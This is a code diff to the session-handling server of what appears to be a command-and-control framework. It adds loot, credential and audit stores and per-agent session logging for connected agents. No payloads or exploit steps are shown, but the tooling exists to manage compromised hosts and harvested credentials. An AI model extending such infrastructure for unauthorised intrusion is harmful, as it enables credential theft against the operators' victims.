@@ -1,10 +1,25 @@
 from server.core.agent_registry import AgentRegistry
+from server.core.audit import AuditLogger, LootManager, CredentialStore
 from server.commands import build_server_router
 from server.commands.base import ServerSessionContext
 from server.ui.prompt import print_colored, highlight_output, bold, cyan, green, yellow, red, dim
 from server.ui.completer import C2Completer, setup_readline, save_history
 from server.ui.shell import AgentShell
 import os
+
+
+_audit_logger = None
+_loot_manager = None
+_credential_store = None
+
+
+def _init_stores(loot_dir: str):
+    global _audit_logger, _loot_manager, _credential_store
+    if _audit_logger is None:
+        _audit_logger = AuditLogger(loot_dir)
+        _loot_manager = LootManager(loot_dir)
+        _credential_store = CredentialStore(loot_dir)
+    return _audit_logger, _loot_manager, _credential_store
 
 
 def _build_protocol(sock, encryption):
@@ -18,9 +33,11 @@ def _build_protocol(sock, encryption):
 
 
 def run_session(sock, ip, loot_dir, encryption=False):
+    audit, loot, creds = _init_stores(loot_dir)
     protocol = _build_protocol(sock, encryption)
     registry = AgentRegistry()
     agent_id = registry.register(sock, ip)
+    creds.log_session(agent_id, ip, connected=True)
 
     try:
         ctx = ServerSessionContext(
@@ -28,6 +45,7 @@ def run_session(sock, ip, loot_dir, encryption=False):
             protocol=protocol,
             ip=ip,
             loot_dir=loot_dir,
+            agent_id=agent_id,
         )
         router = build_server_router()
 
@@ -40,6 +58,7 @@ def run_session(sock, ip, loot_dir, encryption=False):
         pass
     finally:
         registry.unregister(agent_id)
+        creds.log_session(agent_id, ip, connected=False)
         print_colored(f'[*] {agent_id} ({ip}) disconnected', 'yellow')
         try:
             sock.close()
@@ -96,6 +115,7 @@ def run_master_loop(loot_dir, encryption=False):
                 protocol=protocol,
                 ip=info.ip,
                 loot_dir=loot_dir,
+                agent_id=target_id,
             )
             router = build_server_router()
             commands = list(router._commands.keys())
